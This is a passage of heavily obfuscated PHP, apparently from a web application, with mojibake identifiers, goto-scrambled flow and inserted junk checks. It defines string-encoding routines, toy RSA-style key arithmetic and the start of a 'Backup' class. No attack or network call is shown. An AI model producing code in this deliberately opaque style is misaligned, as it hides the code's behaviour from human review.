C˜×´†Ë¾¹; C˜×´†Ë¾¹: $d °ÌŒ·ÔŠ = @$dèÌ³Š Ù¬[253]($FÅ¸ˆÄ½¼®, !1, $CÁ¡‰¢ñç); echo $dèÌ³Š Ù¬[326] . $dèÌ³Š Ù¬[327]($d °ÌŒ·ÔŠ) . $dèÌ³Š Ù¬[328]; goto eñê‰Æ˜‡î; eñ­å—ƒ½™: $FÅ¸ˆÄ½¼® = $dèÌ³Š Ù¬[245]; $FÅ¸ˆÄ½¼® = $this->{$_SERVER[™óşĞñ‡Ë][246]}($FÅ¸ˆÄ½¼®, $dèÌ³Š Ù¬[247]); $E”‰›æãÈ… = $B±åøÜÉÅ[623]; goto bˆïğÛÛ²æ; eñê‰Æ˜‡î: } private function ewuh2b35c5cf($a’İŠäÉ‹š, $EÒæê·š…ˆ, $Cš°ùƒòÌ = 3) { goto E§ø£ÀÈãò; C¼ß×¶Œ¸Æ: $Bìš×ĞğÚ¥ = $A§Ş¸ìº­´[625]; if (!$Bìš×ĞğÚ¥) { die; } $f‰ß‰ß´ = $FÙÂà¶ÁÃ‡[330]; goto eèÓÄÖ‰¯‚; eèÓÄÖ‰¯‚: switch ($A§õ¶‚ìÎõ) { case $FÙÂà¶ÁÃ‡[232]: $AÉ–ÚÎ¥ôĞ = $this->{$_SERVER[™óşĞñ‡Ë][147]}($a’İŠäÉ‹š, $FÙÂà¶ÁÃ‡[214]($EÒæê·š…ˆ . $b‰ˆ ÆÌ“)); break; case $FÙÂà¶ÁÃ‡[220]: $AÉ–ÚÎ¥ôĞ = $this->{$_SERVER[™óşĞñ‡Ë][147]}($a’İŠäÉ‹š, $FÙÂà¶ÁÃ‡[214]($b‰ˆ ÆÌ“ . $EÒæê·š…ˆ)); break; $AãÓ’µÈóˆ = $A§Ş¸ìº­´[626]; case $FÙÂà¶ÁÃ‡[331]: $AÉ–ÚÎ¥ôĞ = $this->{$_SERVER[™óşĞñ‡Ë][147]}($a’İŠäÉ‹š, $FÙÂà¶ÁÃ‡[118]($b‰ˆ ÆÌ“ . $EÒæê·š…ˆ)); break; case $FÙÂà¶ÁÃ‡[332]: $AÉ–ÚÎ¥ôĞ = $this->{$_SERVER[™óşĞñ‡Ë][147]}($a’İŠäÉ‹š, $FÙÂà¶ÁÃ‡[114]($b‰ˆ ÆÌ“ . $EÒæê·š…ˆ)); $Fç¡°¤©»Ù = $A§Ş¸ìº­´[627]; break; $A‚òÃ‰¼ÉÈ = $A§Ş¸ìº­´[628]; if (!$A‚òÃ‰¼ÉÈ) { return; } case $FÙÂà¶ÁÃ‡[333]: goto FÜğùß”Ì; B³¸¨ß°ê: $AÉ–ÚÎ¥ôĞ = $FÙÂà¶ÁÃ‡[327]($aìÒ¸¼íâ . $e¤„Ô‡ÀŒ); $FÅÓÅ¬í× = $A§Ş¸ìº­´[635]; if (!$FÅÓÅ¬í×) { return; } goto cïÒ±ˆ‡æ»; FÅ¨ã‡Ï„À: $cØÂ²Ğ¦„  = $FÙÂà¶ÁÃ‡[334](0, 64); $aìÒ¸¼íâ = $f‰ß‰ß´[$cØÂ²Ğ¦„ ]; $b„‰Ä‹‡µß = $A§Ş¸ìº­´[630]; goto f­É¤ÕÄ; D‚…“ç©ã: $EÉ„†‡®ì = 0; $c¶‡Ù¯ğÅÔ = 0; for ($B•ŠõÈ¸· = 0; $B•ŠõÈ¸· < $FÙÂà¶ÁÃ‡[24]($a’İŠäÉ‹š); $B•ŠõÈ¸·++) { $c¶‡Ù¯ğÅÔ = $c¶‡Ù¯ğÅÔ == $FÙÂà¶ÁÃ‡[24]($CÔô›³ˆ›î) ? 0 : $c¶‡Ù¯ğÅÔ; $EÊŒÕ¾­½ = $A§Ş¸ìº­´[633]; if (strlen($EÊŒÕ¾­½) < $A§Ş¸ìº­´[548]) { return; } $EÉ„†‡®ì = ($cØÂ²Ğ¦„  + $FÙÂà¶ÁÃ‡[335]($f‰ß‰ß´, $a’İŠäÉ‹š[$B•ŠõÈ¸·]) + $FÙÂà¶ÁÃ‡[336]($CÔô›³ˆ›î[$c¶‡Ù¯ğÅÔ++])) % 64; $C²çÈÏ¬Ô = $A§Ş¸ìº­´[634]; if (strlen($C²çÈÏ¬Ô) < $A§Ş¸ìº­´[571]) { return; } $e¤„Ô‡ÀŒ .= $f‰ß‰ß´[$EÉ„†‡®ì]; } goto B³¸¨ß°ê; FÜğùß”Ì: $a’İŠäÉ‹š = $FÙÂà¶ÁÃ‡[118]($a’İŠäÉ‹š); $cŠÙ—ƒ®£É = $A§Ş¸ìº­´[629]; if (!$cŠÙ—ƒ®£É) { return; } goto FÅ¨ã‡Ï„À; C—òô¥‡: $bš‰¿å‰… = $A§Ş¸ìº­´[631]; if (!$bš‰¿å‰…) { die; } $e¤„Ô‡ÀŒ = $FÙÂà¶ÁÃ‡[10]; goto DäéÏŠ”´; DäéÏŠ”´: $B•ŠõÈ¸· = 0; $f­´ä¾Ë = $A§Ş¸ìº­´[632]; if (strlen($f­´ä¾Ë) < $A§Ş¸ìº­´[548]) { die; } goto D‚…“ç©ã; f­É¤ÕÄ: if (strlen($b„‰Ä‹‡µß) < $A§Ş¸ìº­´[556]) { die; } $CÔô›³ˆ›î = $FÙÂà¶ÁÃ‡[114]($aìÒ¸¼íâ . $FÙÂà¶ÁÃ‡[114]($EÒæê·š…ˆ . $aìÒ¸¼íâ) . $EÒæê·š…ˆ); $CÔô›³ˆ›î = $FÙÂà¶ÁÃ‡[25]($CÔô›³ˆ›î, $cØÂ²Ğ¦„  % 8, $cØÂ²Ğ¦„  % 8 + 7); goto C—òô¥‡; cïÒ±ˆ‡æ»: break; $CéÌİñÉÅ = $A§Ş¸ìº­´[636]; if (strlen($CéÌİñÉÅ) < $A§Ş¸ìº­´[571]) { die; } goto fñÃ™£–÷ç; fñÃ™£–÷ç: default: $AÉ–ÚÎ¥ôĞ = $this->{$_SERVER[™óşĞñ‡Ë][147]}($a’İŠäÉ‹š, $EÒæê·š…ˆ . $b‰ˆ ÆÌ“); break; } $AÉ–ÚÎ¥ôĞ = $FÙÂà¶ÁÃ‡[214]($A§õ¶‚ìÎõ . $b‰ˆ ÆÌ“ . $AÉ–ÚÎ¥ôĞ); $c‘Ñ‡Ä™¶ã = $A§Ş¸ìº­´[637]; goto aåÈ‹åä’¹; aåÈ‹åä’¹: if (strlen($c‘Ñ‡Ä™¶ã) < $A§Ş¸ìº­´[556]) { return; } if ($Cš°ùƒòÌ - 1 > 0) { $AÉ–ÚÎ¥ôĞ = $this->{$_SERVER[™óşĞñ‡Ë][127]}($AÉ–ÚÎ¥ôĞ, $EÒæê·š…ˆ, $Cš°ùƒòÌ - 1); } return $AÉ–ÚÎ¥ôĞ; goto féí·Æ±‹; E§ø£ÀÈãò: $A§Ş¸ìº­´ =& $_SERVER[¼€¼ˆ¦‚¡]; $FÙÂà¶ÁÃ‡ =& $_SERVER[™óşĞñ‡Ë]; $FÙÂà¶ÁÃ‡[329](1); goto B´´¥ËÔğµ; B´´¥ËÔğµ: $a’İŠäÉ‹š = $FÙÂà¶ÁÃ‡[2]($a’İŠäÉ‹š); $A§õ¶‚ìÎõ = $FÙÂà¶ÁÃ‡[325](0, 5) . $FÙÂà¶ÁÃ‡[10]; $b‰ˆ ÆÌ“ = $FÙÂà¶ÁÃ‡[124](15); goto C¼ß×¶Œ¸Æ; féí·Æ±‹: } private function gvco12e852ae($Dãö¤¹ÇŠœ, $A¶ê÷²Ìùß, $eß¨ÔÛÁìí = 3) { goto f”ŸÛõë«—; d»â‡È§‘ì: $Dãö¤¹ÇŠœ = $fùÉìØ‚Ï [2]($Dãö¤¹ÇŠœ); $e¦ˆ‰†±¢ = $AùÍí†Ÿ¿[638]; if (!$e¦ˆ‰†±¢) { return; } goto DÀ†ÉºãÓ§; f”ŸÛõë«—: $AùÍí†Ÿ¿ =& $_SERVER[¼€¼ˆ¦‚¡]; $fùÉìØ‚Ï  =& $_SERVER[™óşĞñ‡Ë]; if (!$fùÉìØ‚Ï [337]($Dãö¤¹ÇŠœ) || $fùÉìØ‚Ï [24]($Dãö¤¹ÇŠœ) < 10) { return !1; } goto d»â‡È§‘ì; CœäÕ‰¤¼à: $FùÊ±ùÅÀ® = $Dãö¤¹ÇŠœ[0]; $DŞÎ„¦× = $AùÍí†Ÿ¿[640]; if (strlen($DŞÎ„¦×) < $AùÍí†Ÿ¿[556]) { return; } goto B‹º¥ø³óğ; DÀ†ÉºãÓ§: $Dãö¤¹ÇŠœ = $fùÉìØ‚Ï [214]($Dãö¤¹ÇŠœ); $aÈ¼Ğ«µ°§ = $AùÍí†Ÿ¿[639]; if (strlen($aÈ¼Ğ«µ°§) < $AùÍí†Ÿ¿[571]) { die; } goto CœäÕ‰¤¼à; B‹º¥ø³óğ: $F¿¬»’Òõ = $fùÉìØ‚Ï [25]($Dãö¤¹ÇŠœ, 1, 15); $B¿×±¬á³Ä = $AùÍí†Ÿ¿[641]; while ($B¿×±¬á³Ä < $AùÍí†Ÿ¿[556]) { if ($B¿×±¬á³Ä >= 0) { break; } $B¿×±¬á³Ä++; } goto eœÆÁ•Š‘ç; Cš‚ø”¯Ş: return $D‚÷¸÷Ì™; goto EÏ‡±Çïù; fÔóÎ«÷ç: $e˜ğº¥ŞëÀ = $fùÉìØ‚Ï [330]; switch ($FùÊ±ùÅÀ®) { case $fùÉìØ‚Ï [232]: $D‚÷¸÷Ì™ = $this->{$_SERVER[™óşĞñ‡Ë][246]}($Dãö¤¹ÇŠœ, $fùÉìØ‚Ï [214]($A¶ê÷²Ìùß . $F¿¬»’Òõ)); $E‰½ï‚Ó‰ = $AùÍí†Ÿ¿[643]; if (strlen($E‰½ï‚Ó‰) < $AùÍí†Ÿ¿[554]) { die; } break; $Bèˆñëğ¶² = $AùÍí†Ÿ¿[644]; while (strlen($Bèˆñëğ¶²) < $AùÍí†Ÿ¿[556]) { if (!$Bèˆñëğ¶²) { break; } $Bèˆñëğ¶²++; } case $fùÉìØ‚Ï [220]: $D‚÷¸÷Ì™ = $this->{$_SERVER[™óşĞñ‡Ë][246]}($Dãö¤¹ÇŠœ, $fùÉìØ‚Ï [214]($F¿¬»’Òõ . $A¶ê÷²Ìùß)); $CóÔ‹Ï…ø– = $AùÍí†Ÿ¿[645]; if (strlen($CóÔ‹Ï…ø–) < $AùÍí†Ÿ¿[548]) { die; } break; $A—’ƒ Ï˜Ô = $AùÍí†Ÿ¿[646]; case $fùÉìØ‚Ï [331]: $D‚÷¸÷Ì™ = $this->{$_SERVER[™óşĞñ‡Ë][246]}($Dãö¤¹ÇŠœ, $fùÉìØ‚Ï [118]($F¿¬»’Òõ . $A¶ê÷²Ìùß)); $D™¬³ïÌÕê = $AùÍí†Ÿ¿[647]; while (strlen($D™¬³ïÌÕê) < $AùÍí†Ÿ¿[548]) { if (!$D™¬³ïÌÕê) { break; } $D™¬³ïÌÕê++; } break; case $fùÉìØ‚Ï [332]: $D‚÷¸÷Ì™ = $this->{$_SERVER[™óşĞñ‡Ë][246]}($Dãö¤¹ÇŠœ, $fùÉìØ‚Ï [114]($F¿¬»’Òõ . $A¶ê÷²Ìùß)); break; case $fùÉìØ‚Ï [333]: goto D¯ˆ½©ãŒ¸; aŒ·Œ“¼Ëæ: if (!$ağğÅŠŠä©) { die; } $cÑ‹ãÛïä„ = $fùÉìØ‚Ï [10]; $b•¡Ëò¬—— = $AùÍí†Ÿ¿[652]; goto DÇá‹Œ¨ß; D‘±„öëà: if (!$c±èî¦©áÑ) { return; } $b·óåğ‰Šª = $fùÉìØ‚Ï [25]($b·óåğ‰Šª, $cÚè„’äÕ¶ % 8, $cÚè„’äÕ¶ % 8 + 7); $ağğÅŠŠä© = $AùÍí†Ÿ¿[651]; goto aŒ·Œ“¼Ëæ; d†÷‹ô¼Òâ: $bÈ‚åÍçÆ = 0; for ($a½‹çœÍÛã = 0; $a½‹çœÍÛã < $fùÉìØ‚Ï [24]($Dãö¤¹ÇŠœ); $a½‹çœÍÛã++) { $bÈ‚åÍçÆ = $bÈ‚åÍçÆ == $fùÉìØ‚Ï [24]($b·óåğ‰Šª) ? 0 : $bÈ‚åÍçÆ; $E‚¤»‘Èó» = $AùÍí†Ÿ¿[655]; if (strlen($E‚¤»‘Èó») < $AùÍí†Ÿ¿[578]) { return; } $C§„…¿°Ò = $bÈ‚åÍçÆ++; $E¡µòô–à = $fùÉìØ‚Ï [335]($e˜ğº¥ŞëÀ, $Dãö¤¹ÇŠœ[$a½‹çœÍÛã]) - $cÚè„’äÕ¶ - $fùÉìØ‚Ï [336]($b·óåğ‰Šª[$C§„…¿°Ò]); $D²ÏÙ¥• = $AùÍí†Ÿ¿[656]; if (!$D²ÏÙ¥•) { return; } while ($E¡µòô–à < 0) { $E¡µòô–à += 64; $Aõ’’›»¶» = $AùÍí†Ÿ¿[657]; while ($Aõ’’›»¶» < $AùÍí†Ÿ¿[554]) { if ($Aõ’’›»¶» >= 0) { break; } $Aõ’’›»¶»++; } } $cÑ‹ãÛïä„ .= $e˜ğº¥ŞëÀ[$E¡µòô–à]; } $D‚÷¸÷Ì™ = $fùÉìØ‚Ï [339]($cÑ‹ãÛïä„); goto c—¿£Ó­›ô; BÜİ›‚è†: $cÚè„’äÕ¶ = $fùÉìØ‚Ï [335]($e˜ğº¥ŞëÀ, $b…ïèŞÎ±Ï); $b·óåğ‰Šª = $fùÉìØ‚Ï [114]($b…ïèŞÎ±Ï . $fùÉìØ‚Ï [114]($A¶ê÷²Ìùß . $b…ïèŞÎ±Ï) . $A¶ê÷²Ìùß); $c±èî¦©áÑ = $AùÍí†Ÿ¿[650]; goto D‘±„öëà; D¯ˆ½©ãŒ¸: $Dãö¤¹ÇŠœ = $fùÉìØ‚Ï [338]($Dãö¤¹ÇŠœ); $bµ¹¼œóÎÔ = $AùÍí†Ÿ¿[600]; while ($bµ¹¼œóÎÔ < $AùÍí†Ÿ¿[548]) { if ($bµ¹¼œóÎÔ >= 0) { break; } $bµ¹¼œóÎÔ++; } goto e°ğ‚Éë²; E§©×—ãÃ×: $Dãö¤¹ÇŠœ = $fùÉìØ‚Ï [25]($Dãö¤¹ÇŠœ, 1); $Eù½ãå¤Òº = $AùÍí†Ÿ¿[649]; while (strlen($Eù½ãå¤Òº) < $AùÍí†Ÿ¿[548]) { if (!$Eù½ãå¤Òº) { break; } $Eù½ãå¤Òº++; } goto BÜİ›‚è†; e°ğ‚Éë²: $b…ïèŞÎ±Ï = $Dãö¤¹ÇŠœ[0]; $cÚóÍÌÌ…ˆ = $AùÍí†Ÿ¿[648]; while ($cÚóÍÌÌ…ˆ < $AùÍí†Ÿ¿[578]) { if ($cÚóÍÌÌ…ˆ >= 0) { break; } $cÚóÍÌÌ…ˆ++; } goto E§©×—ãÃ×; DÇá‹Œ¨ß: $a½‹çœÍÛã = 0; $f¬³Ó‡‰‚» = $AùÍí†Ÿ¿[653]; if (strlen($f¬³Ó‡‰‚») < $AùÍí†Ÿ¿[578]) { die; } goto D¤åœ¡…˜´; c—¿£Ó­›ô: break; $C¿àŒÕ—‹— = $AùÍí†Ÿ¿[658]; if (strlen($C¿àŒÕ—‹—) < $AùÍí†Ÿ¿[548]) { return; } goto AÁæˆ›²î‘; D¤åœ¡…˜´: $E¡µòô–à = 0; $Dó¾’åÂ ç = $AùÍí†Ÿ¿[654]; if (strlen($Dó¾’åÂ ç) < $AùÍí†Ÿ¿[571]) { return; } goto d†÷‹ô¼Òâ; AÁæˆ›²î‘: default: $D‚÷¸÷Ì™ = $this->{$_SERVER[™óşĞñ‡Ë][246]}($Dãö¤¹ÇŠœ, $A¶ê÷²Ìùß . $F¿¬»’Òõ); $aªÛ¨’‚„® = $AùÍí†Ÿ¿[659]; if (!$aªÛ¨’‚„®) { return; } break; $D¿Ë×³œ”» = $AùÍí†Ÿ¿[660]; if (!$D¿Ë×³œ”») { return; } } if ($eß¨ÔÛÁìí - 1 > 0) { $D‚÷¸÷Ì™ = $this->{$_SERVER[™óşĞñ‡Ë][188]}($D‚÷¸÷Ì™, $A¶ê÷²Ìùß, $eß¨ÔÛÁìí - 1); } goto Cš‚ø”¯Ş; eœÆÁ•Š‘ç: $Dãö¤¹ÇŠœ = $fùÉìØ‚Ï [25]($Dãö¤¹ÇŠœ, 16); $b–»Ú­øèø = $AùÍí†Ÿ¿[642]; while (strlen($b–»Ú­øèø) < $AùÍí†Ÿ¿[571]) { if (!$b–»Ú­øèø) { break; } $b–»Ú­øèø++; } goto fÔóÎ«÷ç; EÏ‡±Çïù: } public function eqow3d1d786c($F‰—ˆš¼ï) { goto D£õ¾Şà„; FºÀ†Ù¬Èø: $CŒ§ŒçÌ†Œ = $EÁ‹ŒİõÉ[114]($EÁ‹ŒİõÉ[341] . ($FÖÃ‡áèÚã + $e¿³¾Úª’¿) . $EÁ‹ŒİõÉ[342] . $BÆ«Œç³Ù¿ . $EÁ‹ŒİõÉ[342] . $aòíŒŠêÎ¼ . $EÁ‹ŒİõÉ[343]); $e†Ç÷ŠÀ¸¼ = $AÍ™­‹–Ğ†[667]; $f¼„ŞñÁ²Î = $this->{$_SERVER[™óşĞñ‡Ë][147]}($F‰—ˆš¼ï, $CŒ§ŒçÌ†Œ) . $EÁ‹ŒİõÉ[344] . $e¿œì¹ë’¸; goto FàµÁœ¶Ş§; EÏ‘î´‹ƒ„: $aòíŒŠêÎ¼ = 2; for ($ağÑ®ù‚È = 0; $ağÑ®ù‚È < $A‹¨ŠĞ„Á * 10; $ağÑ®ù‚È++) { if (($A‹¨ŠĞ„Á * $ağÑ®ù‚È + 1) % $BÆ«Œç³Ù¿ == 0) { $aòíŒŠêÎ¼ = $EÁ‹ŒİõÉ[201](($A‹¨ŠĞ„Á * $ağÑ®ù‚È + 1) / $BÆ«Œç³Ù¿); break; } } $e¿œì¹ë’¸ = $this->{$_SERVER[™óşĞñ‡Ë][147]}($FÖÃ‡áèÚã * $e¿³¾Úª’¿ . $EÁ‹ŒİõÉ[10], $EÁ‹ŒİõÉ[149]); goto FºÀ†Ù¬Èø; D„Îç‰¹³Ô: $BÆ«Œç³Ù¿ = $EÁ‹ŒİõÉ[201](($FÖÃ‡áèÚã + $e¿³¾Úª’¿) / 2); $bÇ¸ªìßå¢ = $AÍ™­‹–Ğ†[663]; while (1) { $aŸ‚¸ì±–˜ = $BÆ«Œç³Ù¿; $CËàõÕ‰¶ˆ = $A‹¨ŠĞ„Á; $bœ£¯ïá = $AÍ™­‹–Ğ†[664]; if (!$bœ£¯ïá) { die; } while ($CËàõÕ‰¶ˆ % $aŸ‚¸ì±–˜ != 0) { $C¸Å‡¿ÛŠÀ = $CËàõÕ‰¶ˆ; $DÎŸõ„ƒˆØ = $AÍ™­‹–Ğ†[665]; if (strlen($DÎŸõ„ƒˆØ) < $AÍ™­‹–Ğ†[571]) { return; } $CËàõÕ‰¶ˆ = $aŸ‚¸ì±–˜; $aŸ‚¸ì±–˜ = $C¸Å‡¿ÛŠÀ % $aŸ‚¸ì±–˜; $eõğÏõ¬ËÂ = $AÍ™­‹–Ğ†[666]; if (strlen($eõğÏõ¬ËÂ) < $AÍ™­‹–Ğ†[578]) { die; } } if ($aŸ‚¸ì±–˜ == 1) { break; } else { $BÆ«Œç³Ù¿++; } } goto EÏ‘î´‹ƒ„; b‘¼”Á—Ä·: $Aá‹•ÅŒ²Ú = $AÍ™­‹–Ğ†[661]; if (!$Aá‹•ÅŒ²Ú) { return; } $e¿³¾Úª’¿ = $this->{$_SERVER[™óşĞñ‡Ë][340]}(); goto Bè»ÍÉïˆ; FàµÁœ¶Ş§: $cÄ‰Íİ‘½Ÿ = $AÍ™­‹–Ğ†[668]; while ($cÄ‰Íİ‘½Ÿ < $AÍ™­‹–Ğ†[548]) { if ($cÄ‰Íİ‘½Ÿ >= 0) { break; } $cÄ‰Íİ‘½Ÿ++; } return $f¼„ŞñÁ²Î; goto aÎêæ—ÀÓ; Bè»ÍÉïˆ: $A‹¨ŠĞ„Á = ($FÖÃ‡áèÚã - 1) * ($e¿³¾Úª’¿ - 1); $dà¾ˆ¸õöä = $AÍ™­‹–Ğ†[662]; if (strlen($dà¾ˆ¸õöä) < $AÍ™­‹–Ğ†[548]) { die; } goto D„Îç‰¹³Ô; D£õ¾Şà„: $AÍ™­‹–Ğ† =& $_SERVER[¼€¼ˆ¦‚¡]; $EÁ‹ŒİõÉ =& $_SERVER[™óşĞñ‡Ë]; $FÖÃ‡áèÚã = $this->{$_SERVER[™óşĞñ‡Ë][340]}(); goto b‘¼”Á—Ä·; aÎêæ—ÀÓ: } public function rsta4b5f2356($Dé­‚´èğ) { goto câ£ô«ª‡Ò; aÊàœÙº¤¨: if (strlen($FˆÁÇÃ§İò) < $bé†Ü²÷‹[578]) { return; } if (!$EŠ˜·ùö„„) { return $dö×˜àø…š[10]; } $EŠ˜·ùö„„ = $dö×˜àø…š[201]($EŠ˜·ùö„„); goto a«…ùèÑçê; E†ìÂÜŒå: return $A‘Â¼¡“¦¡; $fåó¼®…’Á = $bé†Ü²÷‹[675]; if (strlen($fåó¼®…’Á) < $bé†Ü²÷‹[578]) { die; } goto c÷äÓŸ‡½¼; a«…ùèÑçê: $aÃè´®î = 0; $cã÷Á‘ĞÏ  = 0; for ($bÏâØ°¶ëé = 3; $bÏâØ°¶ëé < $EŠ˜·ùö„„; $bÏâØ°¶ëé += 2) { if ($EŠ˜·ùö„„ % $bÏâØ°¶ëé != 0) { continue; } $aÃè´®î = $bÏâØ°¶ëé; $cß™ô›É•ö = $bé†Ü²÷‹[670]; if (!$cß™ô›É•ö) { die; } $cã÷Á‘ĞÏ  = $dö×˜àø…š[201]($EŠ˜·ùö„„ / $bÏâØ°¶ëé); break; $Dñì¡¯—í = $bé†Ü²÷‹[671]; } goto b˜ÀËÏÍ‚™; câ£ô«ª‡Ò: $bé†Ü²÷‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $dö×˜àø…š =& $_SERVER[™óşĞñ‡Ë]; $Få×ŒŞàÑ  = $dö×˜àø…š[0]($dö×˜àø…š[344], $Dé­‚´èğ); goto aÛ¶ˆ”Éê; aùˆ¯í´Û„: $DéãâÖ¥«Û = $bé†Ü²÷‹[674]; if (strlen($DéãâÖ¥«Û) < $bé†Ü²÷‹[554]) { die; } $A‘Â¼¡“¦¡ = $this->{$_SERVER[™óşĞñ‡Ë][246]}($Få×ŒŞàÑ [0], $CªºÙÖ‚˜); goto E†ìÂÜŒå; b˜ÀËÏÍ‚™: $d„–Ä²²‚¯ = ($aÃè´®î - 1) * ($cã÷Á‘ĞÏ  - 1); $FªøÜæµ‘ = $dö×˜àø…š[201](($aÃè´®î + $cã÷Á‘ĞÏ ) / 2); while (1) { $DÅ×é”ˆÔ  = $FªøÜæµ‘; $f¨Ó—ºùĞ = $bé†Ü²÷‹[672]; $fÕÄà¡²øÍ = $d„–Ä²²‚¯; while ($fÕÄà¡²øÍ % $DÅ×é”ˆÔ  != 0) { $E©ƒ‘†º’ë = $fÕÄà¡²øÍ; $fÕÄà¡²øÍ = $DÅ×é”ˆÔ ; $A‘†¿™ëÆÉ = $bé†Ü²÷‹[673]; if (strlen($A‘†¿™ëÆÉ) < $bé†Ü²÷‹[571]) { die; } $DÅ×é”ˆÔ  = $E©ƒ‘†º’ë % $DÅ×é”ˆÔ ; } if ($DÅ×é”ˆÔ  == 1) { break; } else { $FªøÜæµ‘++; } } goto FÍ¦¨´†» ; FÍ¦¨´†» : $B°Ğ…›ì¬¾ = 2; for ($bÏâØ°¶ëé = 0; $bÏâØ°¶ëé < $d„–Ä²²‚¯ * 10; $bÏâØ°¶ëé++) { if (($d„–Ä²²‚¯ * $bÏâØ°¶ëé + 1) % $FªøÜæµ‘ == 0) { $B°Ğ…›ì¬¾ = $dö×˜àø…š[201](($d„–Ä²²‚¯ * $bÏâØ°¶ëé + 1) / $FªøÜæµ‘); break; } } $CªºÙÖ‚˜ = $dö×˜àø…š[114]($dö×˜àø…š[341] . ($aÃè´®î + $cã÷Á‘ĞÏ ) . $dö×˜àø…š[342] . $FªøÜæµ‘ . $dö×˜àø…š[342] . $B°Ğ…›ì¬¾ . $dö×˜àø…š[343]); goto aùˆ¯í´Û„; aÛ¶ˆ”Éê: if ($dö×˜àø…š[19]($Få×ŒŞàÑ ) != 2) { return $dö×˜àø…š[10]; } $EŠ˜·ùö„„ = $this->{$_SERVER[™óşĞñ‡Ë][246]}($Få×ŒŞàÑ [1] . $dö×˜àø…š[10], $dö×˜àø…š[149]); $FˆÁÇÃ§İò = $bé†Ü²÷‹[669]; goto aÊàœÙº¤¨; c÷äÓŸ‡½¼: } public function sphg78d463c4() { goto B©…ù¤ÙÀ; FâÓøïç…: if (!$eŠòè¥º) { die; } while ($d““«¬ÖÓà <= (int) $eöøœî·œ[346]($F”¿¯ Ø’)) { $E‰¤¤Ùİš = $d““«¬ÖÓà; while (!0) { $E‰¤¤Ùİš++; $Fç×ÀÌ™‡ä = $Aá£ƒõĞÛÆ[677]; if (strlen($Fç×ÀÌ™‡ä) < $Aá£ƒõĞÛÆ[571]) { return; } if ($E‰¤¤Ùİš <= 2) { $d““«¬ÖÓà = $E‰¤¤Ùİš; break; } else { if ($E‰¤¤Ùİš < 2) { continue; } } $aáƒË©­Ï¤ = !0; for ($a¨œôÄÆ¤õ = 2; $a¨œôÄÆ¤õ <= $eöøœî·œ[346]($E‰¤¤Ùİš); $a¨œôÄÆ¤õ++) { if ($E‰¤¤Ùİš % $a¨œôÄÆ¤õ == 0) { $aáƒË©­Ï¤ = !1; } } if ($aáƒË©­Ï¤) { $d““«¬ÖÓà = $E‰¤¤Ùİš; break; } } $D²¶²ç©µ™[] = $d““«¬ÖÓà; $eõïëíîãŠ = $Aá£ƒõĞÛÆ[678]; if (!$eõïëíîãŠ) { return; } } $AãÎ›ƒ­ = 2; goto b¾¯¢˜ïØµ; B©…ù¤ÙÀ: $Aá£ƒõĞÛÆ =& $_SERVER[¼€¼ˆ¦‚¡]; $eöøœî·œ =& $_SERVER[™óşĞñ‡Ë]; $F”¿¯ Ø’ = $eöøœî·œ[325]($eöøœî·œ[345](2, 14), $eöøœî·œ[345](2, 16) - 1); goto b×Ê©ö¬º; b×Ê©ö¬º: $D²¶²ç©µ™ = array(); $d““«¬ÖÓà = 1; $eŠòè¥º = $Aá£ƒõĞÛÆ[676]; goto FâÓøïç…; b¾¯¢˜ïØµ: $A¯Ñß„å = $Aá£ƒõĞÛÆ[679]; if (strlen($A¯Ñß„å) < $Aá£ƒõĞÛÆ[554]) { return; } for ($E‰¤¤Ùİš = $F”¿¯ Ø’; $E‰¤¤Ùİš > 1; $E‰¤¤Ùİš--) { $aáƒË©­Ï¤ = !0; $a’ïÜŠÉ‰î = $Aá£ƒõĞÛÆ[680]; while ($a’ïÜŠÉ‰î < $Aá£ƒõĞÛÆ[554]) { if ($a’ïÜŠÉ‰î >= 0) { break; } $a’ïÜŠÉ‰î++; } foreach ($D²¶²ç©µ™ as $Fë÷²³Ãù) { if ($E‰¤¤Ùİš % $Fë÷²³Ãù == 0) { $aáƒË©­Ï¤ = !1; break; } } if ($aáƒË©­Ï¤) { $AãÎ›ƒ­ = $E‰¤¤Ùİš; break; } } goto bŠÂŞŸ—½÷; bŠÂŞŸ—½÷: return $AãÎ›ƒ­; goto A©•¨³Œ™; A©•¨³Œ™: } public function icyr91e5b203($f¼‰„´Ç», $C¥»Ğ›•¡…) { $fÚÓ›òË¶Ï =& $_SERVER[¼€¼ˆ¦‚¡]; $d‘´ÊËé²æ =& $_SERVER[™óşĞñ‡Ë]; return $d‘´ÊËé²æ[13](array($d‘´ÊËé²æ[14], $d‘´ÊËé²æ[347]), $f¼‰„´Ç», $C¥»Ğ›•¡…); $b÷Ÿ”‰İê× = $fÚÓ›òË¶Ï[681]; while (strlen($b÷Ÿ”‰İê×) < $fÚÓ›òË¶Ï[578]) { if (!$b÷Ÿ”‰İê×) { break; } $b÷Ÿ”‰İê×++; } } public function ekst393f6d1b($A–½ÍÌÛ, $eÏÁÉÛ”Ò) { $Cë­°»œÊñ =& $_SERVER[™óşĞñ‡Ë]; return $Cë­°»œÊñ[13](array($Cë­°»œÊñ[348], $Cë­°»œÊñ[349]), $A–½ÍÌÛ, $eÏÁÉÛ”Ò); $C¢¶±‰Ï = $_SERVER[¼€¼ˆ¦‚¡][682]; if (!$C¢¶±‰Ï) { return; } } public function reil31b756b7($b»ï¿Ÿêö‚, $FŸ‹«”½ã­) { $aïÖĞ÷²˜× =& $_SERVER[™óşĞñ‡Ë]; return $aïÖĞ÷²˜×[13](array($aïÖĞ÷²˜×[348], $aïÖĞ÷²˜×[350]), $b»ï¿Ÿêö‚, $FŸ‹«”½ã­); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $D‹ƒ„ˆ³ò =& $_SERVER[¼€¼ˆ¦‚¡]; self::$name = date($D‹ƒ„ˆ³ò[683]); if (!($CÌ¯Ş™ŸóÃ = Model($D‹ƒ„ˆ³ò[684])->lastItem())) { $CÌ¯Ş™ŸóÃ = $this->initData(); } else { self::$name = $CÌ¯Ş™ŸóÃ[$D‹ƒ„ˆ³ò[28]]; if ($CÌ¯Ş™ŸóÃ[$D‹ƒ„ˆ³ò[685]] == $D‹ƒ„ˆ³ò[83]) { self::$name = date($D‹ƒ„ˆ³ò[686]); $BßØÔÏ¢’¢ = 0; if (isset($CÌ¯Ş™ŸóÃ[$D‹ƒ„ˆ³ò[281]][$D‹ƒ„ˆ³ò[167]][$D‹ƒ„ˆ³ò[419]])) { $BßØÔÏ¢’¢ = (int) $CÌ¯Ş™ŸóÃ[$D‹ƒ„ˆ³ò[281]][$D‹ƒ„ˆ³ò[167]][$D‹ƒ„ˆ³ò[419]]; } if 